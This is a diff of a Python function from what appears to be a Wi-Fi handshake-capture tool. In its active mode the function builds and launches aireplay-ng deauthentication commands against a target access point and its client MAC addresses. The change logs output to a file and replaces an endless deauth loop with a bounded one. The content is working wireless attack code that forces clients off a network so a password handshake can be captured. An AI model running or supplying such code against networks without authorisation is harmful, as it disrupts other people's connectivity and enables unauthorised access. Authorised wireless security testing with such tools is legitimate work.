@@ -426,20 +426,20 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None, client
     deauth_proc = None
     if mode == "ativo":
         clients_macs = clients_macs or []
+        dlog = f"{WORK}/deauth.log"
         if clients_macs:
             cmds = []
             for cm in clients_macs:
-                cmds.append(f"aireplay-ng --deauth 8 -a {bssid} -c {cm} {iface} >/dev/null 2>&1")
+                cmds.append(f"aireplay-ng --deauth 8 -a {bssid} -c {cm} {iface} >>{dlog} 2>&1")
             loop = "; ".join(cmds)
             deauth_proc = subprocess.Popen(
-                ["bash", "-c", f"sleep 3; while true; do {loop}; sleep 6; done"],
+                ["bash", "-c", f"sleep 3; for i in $(seq 1 10); do {loop}; sleep 6; done"],
                 preexec_fn=os.setsid,
             )
         else:
             deauth_proc = subprocess.Popen(
                 ["bash", "-c",
-                 f"sleep 3; while true; do aireplay-ng --deauth 5 -a {bssid} {iface} "
-                 f">/dev/null 2>&1; sleep 8; done"],
+                 f"sleep 3; aireplay-ng --deauth 5 -a {bssid} {iface} >>{dlog} 2>&1"],
                 preexec_fn=os.setsid,
             )
     _capture.update({"proc": airo, "deauth": deauth_proc, "started": time.time(),
